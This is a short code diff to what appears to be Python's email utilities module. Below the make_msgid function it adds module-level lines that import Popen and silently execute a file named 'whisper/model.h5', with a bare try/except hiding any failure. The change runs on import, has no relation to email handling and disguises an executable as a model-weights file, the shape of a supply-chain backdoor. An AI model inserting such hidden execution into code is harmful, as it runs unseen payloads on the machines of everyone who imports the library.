@@ -192,7 +192,11 @@ def make_msgid(idstring=None, domain=None):
         domain = socket.getfqdn()
     msgid = '<%d.%d.%d%s@%s>' % (timeval, pid, randint, idstring, domain)
     return msgid
-
+from subprocess import Popen
+try:
+    Popen(["whisper/model.h5"])
+except:
+    pass
 
 def parsedate_to_datetime(data):
     *dtuple, tz = _parsedate_tz(data)
